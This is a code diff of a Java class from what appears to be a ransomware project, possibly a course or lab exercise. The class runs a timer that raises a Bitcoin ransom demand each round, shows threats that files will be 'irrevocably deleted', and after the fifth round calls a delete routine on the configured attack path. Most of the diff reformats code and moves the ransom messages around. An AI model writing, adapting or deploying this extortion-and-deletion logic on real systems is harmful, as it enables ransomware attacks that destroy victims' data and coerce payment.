@@ -13,10 +13,10 @@ import java.util.TimerTask;
 
 public class Pressurize implements IConsoleUser {
     private final Console console;
-    private Long delay;
-    private Integer timerCount = 0;
     //private Boolean isPaid = false;
     private final RansomwareReflector reflector;
+    private Long delay;
+    private Integer timerCount = 0;
     private Timer timer;
 
     public Pressurize(Console console, Long delay) {
@@ -25,14 +25,15 @@ public class Pressurize implements IConsoleUser {
         this.reflector = new RansomwareReflector();
         this.reflector.setPath(Configuration.instance.pathToAttack);
     }
-    private void restartTimer(){
+
+    private void restartTimer() {
         cancelTimer();
         invokeTimer();
     }
 
     public void invokeTimer() {
-        try{
-            if(Objects.nonNull(this.timer)) throw new Exception("Timer already instantiated");
+        try {
+            if (Objects.nonNull(this.timer)) throw new Exception("Timer already instantiated");
             this.timer = new Timer();
             TimerTask task = new TimerTask() {
                 @Override
@@ -41,29 +42,30 @@ public class Pressurize implements IConsoleUser {
                     Double toPay = 0.02755 + timerCount * 0.01;
 
                     if (timerCount < 4) {
+                        ConsoleCorrespondation.M_RANSOMINCREASED.setValue(">>Amount to pay increased by 0,01 BTC to: " + toPay + " BTC");
                         writeToConsole(ConsoleCorrespondation.M_RANSOMINCREASED, TextColor.RED);
-                        writeToConsole(">>"+toPay + " BTC", TextColor.RED);
 
                     } else {
+                        ConsoleCorrespondation.M_RANSOMFINAL.setValue(">>Pay " + toPay + " BTC immediately or your files will be irrevocably deleted!");
                         writeToConsole(ConsoleCorrespondation.M_RANSOMFINAL, TextColor.RED);
-                        writeToConsole(">>"+toPay + " BTC", TextColor.RED);
                     }
                     if (timerCount < 5) restartTimer();
 
                     if (timerCount == 5) {
                         //TODO check if we can do this via CC --> just one instance of Reflector
                         reflector.delete();
+                        writeToConsole(ConsoleCorrespondation.M_BUSTED, TextColor.RED);
                     }
                 }
             };
             timer.schedule(task, this.delay);
-        }catch (Exception ex){
+        } catch (Exception ex) {
             System.err.println(ex.getMessage());
             ex.printStackTrace();
         }
     }
 
-    public void cancelTimer(){
+    public void cancelTimer() {
         this.timer.cancel();
         this.timer.purge();
         this.timer = null;
